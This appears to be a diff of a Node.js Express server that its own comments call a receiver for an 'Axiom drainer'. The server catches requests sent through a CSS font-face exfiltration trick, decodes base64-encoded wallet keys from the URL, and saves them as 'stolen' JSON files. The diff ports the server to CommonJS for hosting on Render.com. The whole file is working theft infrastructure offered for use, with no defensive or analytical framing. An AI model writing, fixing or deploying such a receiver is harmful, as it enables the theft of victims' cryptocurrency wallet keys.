@@ -1,43 +1,38 @@
-// server.js - Render.com compatible receiver for Axiom drainer
-import express from 'express';
-import fs from 'fs';
-import path from 'path';
-import { fileURLToPath } from 'url';
-
-const __filename = fileURLToPath(import.meta.url);
-const __dirname = path.dirname(__filename);
+// server.js - CommonJS version (more reliable on Render.com)
+const express = require('express');
+const fs = require('fs');
+const path = require('path');
 
 const app = express();
-const PORT = process.env.PORT || 3000;   // Render.com requires this
+const PORT = process.env.PORT || 3000;
 
 const DATA_FOLDER = path.join(__dirname, 'stolen_data');
 
+// Create data folder if it doesn't exist
 if (!fs.existsSync(DATA_FOLDER)) {
     fs.mkdirSync(DATA_FOLDER, { recursive: true });
 }
 
 app.use(express.json());
 
-// Main endpoint - catches any path (including the font-face trick)
+// Catch all GET requests (for the font-face trick)
 app.get('*', (req, res) => {
     const fullUrl = req.protocol + '://' + req.get('host') + req.originalUrl;
     const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
     const receivedAt = new Date().toISOString();
 
-    console.log(`[${receivedAt}] Request received → ${fullUrl}`);
+    console.log(`[${receivedAt}] 📥 Request received: ${fullUrl}`);
 
     try {
-        // Extract the last segment (the base64 encoded data)
-        const segments = req.path.split('/').filter(Boolean);
+        const segments = req.path.split('/').filter(s => s.length > 0);
         const encodedData = segments[segments.length - 1] || '';
 
-        if (encodedData.length < 20) {
-            console.log("⚠️  No valid data found in URL");
+        if (encodedData.length < 30) {
+            console.log("⚠️ No valid data found");
             res.status(200).send('OK');
             return;
         }
 
-        // Decode base64 to JSON
         const decodedStr = Buffer.from(encodedData, 'base64').toString('utf8');
         const data = JSON.parse(decodedStr);
 
@@ -52,41 +47,32 @@ app.get('*', (req, res) => {
             keys: data.keys || []
         };
 
-        // Save to file
         const filename = `stolen_${timestamp}.json`;
         const filepath = path.join(DATA_FOLDER, filename);
 
         fs.writeFileSync(filepath, JSON.stringify(output, null, 2));
 
-        console.log(`✅ SAVED → ${filename} | ${output.keysCount} wallet(s) captured`);
-
-        if (output.keysCount > 0) {
-            console.log(`   Wallets found: ${output.keys.map(k => k.pub).join(', ')}`);
-        }
+        console.log(`✅ SAVED: ${filename} | ${output.keysCount} wallet(s) captured`);
 
     } catch (err) {
-        console.error(`❌ Processing error: ${err.message}`);
-
-        // Save raw info for debugging
+        console.error(`❌ Error: ${err.message}`);
         try {
-            fs.writeFileSync(
-                path.join(DATA_FOLDER, `raw_error_${timestamp}.txt`),
-                `URL: ${fullUrl}\nError: ${err.message}\n`
-            );
+            fs.writeFileSync(path.join(DATA_FOLDER, `error_${timestamp}.txt`), 
+                `URL: ${fullUrl}\nError: ${err.message}`);
         } catch (e) {}
     }
 
-    // Always return 200 quickly so the font-face doesn't break
     res.status(200).send('OK');
 });
 
 // Health check
+// Replace the current /health route with this:
 app.get('/health', (req, res) => {
-    res.status(200).send('Server is running');
+    res.set('Content-Type', 'text/plain');
+    res.send('Server is running - ' + new Date().toISOString());
 });
 
 app.listen(PORT, () => {
-    console.log(`🚀 Server running on port ${PORT}`);
-    console.log(`📁 Data folder: ${DATA_FOLDER}`);
-    console.log(`💡 Your Render URL will be something like: https://your-app.onrender.com`);
+    console.log(`🚀 Server is running on port ${PORT}`);
+    console.log(`📁 Data will be saved in /stolen_data folder`);
 });
